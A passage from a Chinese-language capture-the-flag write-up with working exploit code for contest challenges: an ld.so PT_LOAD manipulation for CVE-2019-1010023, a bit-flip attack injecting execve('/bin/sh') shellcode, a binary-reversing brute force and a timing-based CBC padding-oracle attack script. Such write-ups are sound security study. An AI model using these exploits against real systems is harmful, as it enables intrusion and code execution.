resp = conn.get_response()
content = resp.read()

#print(content.decode())

secret = re.findall(r"secret: (.*?) ! ", content.decode())[0]
print(secret)
```


## 证验码 - 未做出

放大图片观察，每个字符的周围其实是不同的灰色像素点  
所以肯定是提取出每个字符包含的不同颜色的像素点的个数，然后找一组16个字符的组合让结果和给出的图片的统计数量最接近  

算法不会写，过  

## 动态链接库检查器

CVE-2019-1010023，文章找到了：  
https://sourceware.org/bugzilla/show_bug.cgi?id=22851  

开始没有看Makefile，没用make evil；后来注意到了，但是本地测试（Ubuntu 20.04）ldd main可以成功，ldd libevil.so不成功  
而服务器只能上传一个文件  

尝试理解原理自己构造，文章解释说根本原因在于ld.so假设Program Header的所有PT_LOAD条目的virtual addr是从小到大排序的  
所以只要让位于中间的PT_LOAD段的virtual addr很大，就可以映射到后面的地址  

正常编译一个可执行文件，代码段是cat flag的shellcode并在前面用大量的nop sled填充（这样地址偏移的计算就不用很精确了）  
readelf -l看program header：  
```
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000530 0x0000000000000530  R      0x1000
  LOAD           0x0000000000001000 0x0000000000001000 0x0000000000001000
                 0x0000000000020a05 0x0000000000020a05  R E    0x1000
  LOAD           0x0000000000022000 0x0000000000022000 0x0000000000022000
                 0x0000000000000130 0x0000000000000130  R      0x1000
  LOAD           0x0000000000022df0 0x0000000000023df0 0x0000000000023df0
                 0x0000000000000220 0x0000000000000228  RW     0x1000
```
第二个load段是代码段，用十六进制编辑器找到VirtAddr和PhysAddr的两个0x1000，改为0x21000（这里是文件与ld.so在内存中的大致相对偏移）即可：  
```
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000530 0x0000000000000530  R      0x1000
  LOAD           0x0000000000001000 0x0000000000021000 0x0000000000021000
                 0x0000000000020a05 0x0000000000020a05  R E    0x1000
  LOAD           0x0000000000022000 0x0000000000022000 0x0000000000022000
                 0x0000000000000130 0x0000000000000130  R      0x1000
  LOAD           0x0000000000022df0 0x0000000000023df0 0x0000000000023df0
                 0x0000000000000220 0x0000000000000228  RW     0x1000
```

## 超精准的宇宙射线模拟器

本场比赛做出来的第一道题  

call exit 的地方翻转一个bit，可以call到mprotect的开头  
（系统调用的参数乱给一般只会返回错误而不会崩溃，库函数则不然）  

代码段可写，有了循环之后把shellcode写进去，再翻转call的一个bit到shellcode即可  

```
from pwn import *

context.terminal = ["tmux", "split", "-h"]

binsh = u64("/bin/sh\0")

shellcode = asm(f"""
        movabs rax, {hex(binsh)}
        push rax
        mov rdi, rsp
        xor esi, esi
        xor edx, edx
        mov eax, 59
        syscall
""", arch="amd64")

with open("./bitflip", "rb") as f:
    f.seek(0x10e0)
    rawcode = f.read(len(shellcode))

def doflip(addr, offset):
    global s
    s.sendlineafter("You can flip only one bit in my memory. Where do you want to flip?", hex(addr)+" "+str(offset))
    s.recvuntil("Done.")

#s = process("./bitflip")
s = remote("202.38.93.111", 10231) ; s.sendlineafter("token", "<hide here>")
#attach(s)
doflip(0x401296, 1+4)


for i in range(len(shellcode)):
    for j in range(8):
        if ( ((shellcode[i] ^ rawcode[i]) >> j) & 1):
            doflip(0x4010e0+i, j)

doflip(0x401296, 2+4)

s.interactive()
```

## 超迷你的挖矿模拟器 - 未做出

java的代码看起来太难受（java语言的锅，不是代码写的不好），所以没注意到非预期解的存在  
预期解超出能力范围了  

## Flag计算机

ida先按PE格式打开，看到"This is not a Windows PE program"联想到了"This program cannot be run in DOS mode"  
看了眼DOS stub发现内容很多，再用ida按照DOS格式打开，一切明朗（还好没在64位的代码里迷失）  

不能F5很烦躁，把DOS头最后指示PE头位置的字段改成0，就可以用Ghidra打开看反编译了  
（Ghidra没有识别出栈帧（可能是因为程序都是用esp找临时变量，没用ebp），导致所有的临时变量都是\*(栈指针+偏移)的形式，看着也很累）  

两边配合着看，数据段的指针值和ida识别出的虚拟地址有0x100的偏移（不知道原因，没找到初始化ds段寄存器的地方）  

理清逻辑，复现+爆破即可  
（第一遍逆向所有的15长度都看成了16……又是调了两个小时才通）  
```
def u32(s):
    assert(len(s) == 4)
    return int.from_bytes(s, 'little')

def u16(s):
    assert(len(s) == 2)
    return int.from_bytes(s, 'little')

def signint16(n):
    n = n & 0xffff
    if (n & 0x8000):
        n -= 0x10000
    return n

with open("get_flag_system_fixed.exe", "rb") as f:
    f.seek(0x2920-0x100+0x40)
    global2920_bytes = f.read(15*15*4)
    f.seek(0x33C0-0x100+0x40)
    global33C0_bytes = f.read(30*2)

global2920 = [u32(global2920_bytes[i*4:i*4+4]) for i in range(15*15)]
global33C0 = [u16(global33C0_bytes[i*2:i*2+2]) for i in range(30)]
print(hex(global2920[0]))
print(hex(global33C0[0]))

global345c = None
global3404 = None

global3420 = [0]*15

current_time = None

def simple_srand():
    global current_time
    global global345c
    global global3404
    global345c = current_time % 0xe40b
    global3404 = 0x41c64e6d

def simple_rand():
    global global345c
    global global3404
    global3404 = global3404 * global345c + 0xbc614e
    return global3404 & 0xffffffff

def generate_global3420():
    global global3420
    global3420 = [0]*15
    simple_srand()
    buf3 = [None]*15
    for i in range(15):
        buf3[i] = simple_rand()
    for i in range(15):
        for j in range(15):
            global3420[i] = global3420[i] + signint16(buf3[j] * global2920[15*i+j])

def generate_flag():
    return bytes([(global33C0[i] ^ global3420[i % 0xf]) & 0xff for i in range(30)])


for current_time in range(0xe40b):    # 0xe40b
    if current_time % 1000 == 0:
        print(current_time)
    generate_global3420()
    r = generate_flag()
    #if (r.isascii()):
    if (b'flag' in r):
    #if (r[:2] == b'\xfc\xd9'):
        print(r)
```

## 中间人

第一反应是picoctf 2018的James Brahm Returns，找了那道题的wp放这道题跑了半小时没出结果，本地调试才注意到这道题的unpad检查了所有的padding字节，比那道题更难  

第二三问我用了时间测信道的非预期，能够准确区分padding是否正确之后就是普通的cbc padding oracle  
（看到 https://moxie.org/2011/12/13/the-cryptographic-doom-principle.html 这篇文章才想到利用这一点）  

计算长度以及调各种块的偏移的代码写了很多遍才写对……  
先是无线网，调整长度使得padding正确的返回时间在2-3秒左右，padding错误的返回时间在0.6-0.7秒左右，但是网络时常抽风，有时会突然延迟4-5秒，很难精确判断  
坑了好久之后无果，后来换了新的地方，旁边有根网线顺手插上，结果padding正确的返回时间是0.7秒，padding错误的返回时间是0.07s，而且相当稳定，打远程成功率100%  
（所以爆破一定要用网线）  
远程有超时，一次连接只能得到14字节左右，多跑几次即可  

交了后两问之后才回头做的第一问，sha256的速度太快了没法测信道，不过最后第一问是预期解做的  
（起初思路还是被padding oracle限制了，想的是控制mac不变然后用padding做oracle（这其实是第二三问的做法）；第一问则是控制padding正常用mac做oracle）  

```
from pwn import *
from time import time
from hashlib import sha256

def bytes_xor(b1, b2):
    return bytes([x ^ y for x, y in zip(b1, b2)])

def talk_to_alice(name, extra):
    global s
    s.sendlineafter("Whom do you want to talk to? ", "Alice")
    s.sendlineafter("What's your name?", name.hex())
    s.sendlineafter("What else do you want to say?", extra.hex())
    s.recvuntil("This is my encrypted message, please take it to Bob:\n")
    r = s.recvline(keepends=False).decode()
    return bytes.fromhex(r)

def talk_to_bob(ciphertext):
    global s
    s.sendlineafter("Whom do you want to talk to? ", "Bob")
    s.sendlineafter("Show me your message from Alice: ", ciphertext.hex())
    r = s.recvline(keepends=False).decode()
    if r == "Thanks":
        return True
    elif r == "What's your problem???":
        return False
    else:
        print(repr(r))
        assert(0)

def find_key_len(maclen):
    global s
    constlen = len("Thanks ")+len(" for taking my flag: ")
    last_len = len(talk_to_alice(1*b'\0', b'\0'))
    for i in range(2, 18):
        r = talk_to_alice(i*b'\0', b'\0')
        if(len(r)-last_len == 16):
            # now padding len and iv len is 16
            flaglen = len(r)-16-16-maclen-constlen-i-1
            break
        else:
            last_len = len(r)
    print(flaglen)
    return flaglen

def mitm1():
    global s
    constlen = len("Thanks ")+len(" for taking my flag: ")

    s.sendlineafter("Which level do you want to play (1/2/3)?", "1")

    flaglen = find_key_len(32)

    namebaselen = (16-constlen%16) + (16-flaglen%16)
    extrabaselen = (flaglen+15)//16*16
    flag = b""
    for i in range(1, flaglen+1):
        name = (namebaselen + i) * b'a'
        for c in [10]+list(range(33, 127)):
            print(i, c)
            extra = (extrabaselen - i)*b'b' + sha256(chr(c).encode()+flag[len(flag)-(i-1):]+(extrabaselen - i)*b'b').digest() + b'\x10'*16
            r1 = talk_to_alice(name, extra)
            #r1 = talk_to_alice(b"123", b"456")
            partcipher = r1[16+constlen+namebaselen+flaglen-16:16+constlen+namebaselen+flaglen+extrabaselen+32+16]
            r2 = talk_to_bob(partcipher)
            #r2 = talk_to_bob(r1)
            if(r2):
                flag = chr(c).encode()+flag
                print(flag)
                break


def mitm_2_3(level):
    global s
    constlen = len("Thanks ")+len(" for taking my flag: ")

    s.sendlineafter("Which level do you want to play (1/2/3)?", str(level))

    flaglen = find_key_len(16)

    flag = ""
    for i in range(1, flaglen+1):
        maxtime = 0
        choose = 0
        namebaselen = (16-constlen%16)+((flaglen+15)//16*16)
        name = (namebaselen-i)*b'a'
        extra = (16-flaglen%16)*b'b'+i*b'b'
        r = talk_to_alice(name, extra)    # notice the first 16 bytes is iv
        flagblock = r[16+constlen+namebaselen-16:16+constlen+namebaselen]    # iv len is 16
        beforeflagblock = r[16+constlen+namebaselen-16*2:16+constlen+namebaselen-16]
        beforelastblock = r[-16*2:-16]
        for c in range(256):
            starttime = time()
            talk_to_bob(r[:-16]+b'c'*16*1024*16+ b'd'*15+bytes([c]) +flagblock)
            endtime = time()
            usedtime = endtime - starttime
            print(i, c, usedtime)
            maybe = chr(beforeflagblock[-1]^c^1)
            if(usedtime > 1):
                print(maybe)
            if(usedtime > maxtime):
                maxtime = usedtime
                choose = maybe
                print(choose)
        flag += choose
        print(i, flag)

#s = process(["sh", "-c", "(cd MITM ; python3 entry.py)" "2>/dev/tty"])
s = remote("202.38.93.111", 10041) ; s.sendlineafter("token", "<hide here>")
#mitm_2_3(3)
#mitm_2_3(2)
mitm1()
```

## 不经意传输 - 仅第一问

第一问抄wiki就好  

第二问两个密文可控，但差值已知，而差值在解密后没有任何意义。但是RSA对乘法是同态的，如果能构造密文成倍数关系，则解密后的明文也是倍数关系。  
很容易就构造出了 m0+scale\*m1=c，且scale和c都已知  

明文取值是hexstring的范围，有一小半的bit是固定的，剩下的bit取值范围很小  

考虑了利用倍数控制错位+爆破，觉得暴力量级有点大（而且感觉代码不好写+比赛快结束了）就没做  

